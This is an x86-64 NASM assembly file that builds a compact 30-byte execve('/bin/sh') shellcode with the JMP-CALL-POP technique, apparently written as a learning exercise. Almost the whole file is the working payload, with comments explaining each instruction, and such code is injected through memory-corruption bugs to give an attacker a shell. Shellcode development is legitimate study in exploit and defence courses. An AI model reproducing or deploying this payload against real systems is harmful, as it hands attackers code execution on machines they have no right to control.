; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
; 
; Description : This piece of code generates a execve shellcode by using JMP-CALL-POP method.
;				It actually uses the JMP-CALL-POP method in combination with the STACK METHOD
;				to reduce the size of shellcode since the shellcode generated by the JMP-CALL-POP
;				method will usually take aprox. double the size of STACK METHOD shellcode. 
;
; SHELLCODE LENGTH = 30 Bytes


global _start


section .text
_start:


	jmp PushAdressOfString	


Main:
	pop rdi					; Point RDI to the string "/bin/sh"
		
	push rdi				; Push Address of the label 'shell'
	mov	rsi, rsp			; Point RSI to the location where address of string "/bin/sh"
							;  is stored

	xor rax, rax			; Zero out RAX
	push rax				
	mov	rdx, rsp			; Store the address of 0x0000000000000000 into RDX 

	mov al, 0x3b			; Syscall number for execve() - 59 (0x3b)
	syscall


PushAdressOfString:
	call Main
	shell:	db "/bin/sh",0x00
